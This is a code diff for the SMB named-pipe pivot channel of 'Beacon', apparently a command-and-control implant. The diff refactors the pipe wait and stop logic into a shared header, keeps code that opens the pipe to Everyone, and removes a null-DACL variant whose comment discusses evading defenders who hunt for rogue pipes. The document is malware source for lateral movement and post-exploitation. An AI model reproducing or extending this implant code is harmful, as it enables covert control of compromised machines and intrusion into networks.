@@ -1,14 +1,16 @@
 /*
- * Manage the SMB data channel for Beacon
+ * Manage the SMB data channel for Beacon (pivot variant)
  * Entry point:
  *	1. command_link_wait
  *		user requested SMB data channel
- *	2. smb_init 
- *		create our named pipe with a null ACL
+ *	2. smb_init
+ *		create our named pipe with an Everyone DACL
  *	3. smb_wait
  *		wait for a connection... send agent id when it comes
  *	4. smb_process
  *		process server data please... do normal beacon stuff.
+ * The shared channel body (smb_wait/smb_stop/command_link_wait) lives in
+ * client_smb_common.h; this file only carries the pivot-specific pieces.
  */
 
 #include "beacon.h"
@@ -22,18 +24,7 @@
 #include <aclapi.h>
 #include "parse.h"
 
-extern unsigned int post_type;
-extern unsigned int sleep_time;
-static HANDLE       pipe;
-
-BOOL GarglePipeWait(HANDLE pipe);
-void GargleBlockPipe(HANDLE pipe);
-
-/* call our gargle function */
-static void link_channel_smb_wait(void * thisp) {
-	LCHANNEL * inst = (LCHANNEL *)thisp;
-	GargleBlockPipe(inst->pipe);
-}
+#include "client_smb_common.h"
 
 /* create a new kind of channel */
 LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
@@ -43,33 +34,13 @@ LCHANNEL lchannel_smb_gargle(HANDLE pipe) {
 	return channel;
 }
 
-/*
-* wait for a connection to our named pipe
-*/
-void smb_wait() {
-	if (GarglePipeWait(pipe)) {
-		/* we have a connection, yay */
-	}
-	else {											/* plan B */
-		DWORD fConnected = 0;
-
-		/* wait for a connection to our pipe */
-		while (!fConnected) {
-			fConnected = ConnectNamedPipe(pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
-		}
-	}
-
-	/* OK, kick off our client init routine. */
-	client_init(lchannel_smb_gargle(pipe));
-}
-
 typedef struct {
 	PSID                 pEveryoneSID;
 	PACL                 pACL;
 	PSECURITY_DESCRIPTOR pSD;
 } PIPE_PERM_OBJECTS;
 
-/* 
+/*
  * change pipe permissions
  * https://docs.microsoft.com/en-us/windows/win32/secauthz/creating-a-security-descriptor-for-a-new-object-in-c--?redirectedfrom=MSDN
  */
@@ -97,13 +68,13 @@ BOOL setup_pipe_perms(PIPE_PERM_OBJECTS * ppo, PSECURITY_ATTRIBUTES psa) {
 	if (ERROR_SUCCESS != dwRes)
 		return FALSE;
 
-	// Initialize a security descriptor.  
+	// Initialize a security descriptor.
 	ppo->pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
 
 	if (!InitializeSecurityDescriptor(ppo->pSD, SECURITY_DESCRIPTOR_REVISION))
 		return FALSE;
 
-	// Add the ACL to the security descriptor. 
+	// Add the ACL to the security descriptor.
 	if (!SetSecurityDescriptorDacl(ppo->pSD, TRUE, ppo->pACL, FALSE))
 		return FALSE;
 
@@ -114,7 +85,9 @@ BOOL setup_pipe_perms(PIPE_PERM_OBJECTS * ppo, PSECURITY_ATTRIBUTES psa) {
 
 	return TRUE;
 }
-/* TODO: see how this is called to clean up. done on exit? */
+
+/* done on process exit - the descriptors only need to outlive CreateNamedPipe,
+ * but the pipe lives for the lifetime of the session so we simply keep them */
 void cleanup_pipe_perms(PIPE_PERM_OBJECTS * ppo) {
 	if (ppo->pEveryoneSID)
 		FreeSid(ppo->pEveryoneSID);
@@ -122,27 +95,6 @@ void cleanup_pipe_perms(PIPE_PERM_OBJECTS * ppo) {
 		LocalFree(ppo->pACL);
 	if (ppo->pSD)
 		LocalFree(ppo->pSD);
-}
-
-/*
- * This function is unused, but is here in case we opt to introduce DACL flexibility
- * when folks start using the DACL to conduct hunts for rogue pipes.
- */
-BOOL setup_pipe_perms_null(PIPE_PERM_OBJECTS * ppo, PSECURITY_ATTRIBUTES psa) {
-	/* null out the fields and pointers */
-	memset(ppo, 0, sizeof(PIPE_PERM_OBJECTS));
-
-	/* allocate our security descriptor structure */
-	ppo->pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
-
-	/* setup everything up */
-	InitializeSecurityDescriptor(ppo->pSD, SECURITY_DESCRIPTOR_REVISION);
-	SetSecurityDescriptorDacl(ppo->pSD, TRUE, (PACL)NULL, FALSE);
-	psa->nLength = (DWORD) sizeof(SECURITY_ATTRIBUTES);
-	psa->lpSecurityDescriptor = (LPVOID)ppo->pSD;
-	psa->bInheritHandle = FALSE;
-
-	return TRUE;
 }
 
 /*
@@ -176,42 +128,4 @@ BOOL smb_init() {
 	/* now we can assign the handle */
 	pipe = temps;
 	return TRUE;
-}
-
-/* stop everything */
-void smb_stop() {
-	/* OK, shut everything down! */
-	CloseHandle(pipe);
-
-	/* clean up the resources with our last go */
-	client_stop();
-}
-
-/*
-* put this beacon into a mode where it's waiting for a connection to its pipe
-*/
-void command_link_wait() {
-	/* setup our SMB server */
-	if (!smb_init()) {
-		return;
-	}
-
-	/* while we are an SMB server... do this stuff */
-	while (sleep_time > 0) {
-		/* wait for a connection and send our agent id */
-		smb_wait();
-
-		/* process data */
-		client_process();
-
-		/* close the session */
-		FlushFileBuffers(pipe);
-		DisconnectNamedPipe(pipe);
-	}
-
-	/* we're no longer an SMB server... stop the shenanigans */
-	smb_stop();
-
-	/* just kill the process... it's this or crash */
-	safe_exit();
 }
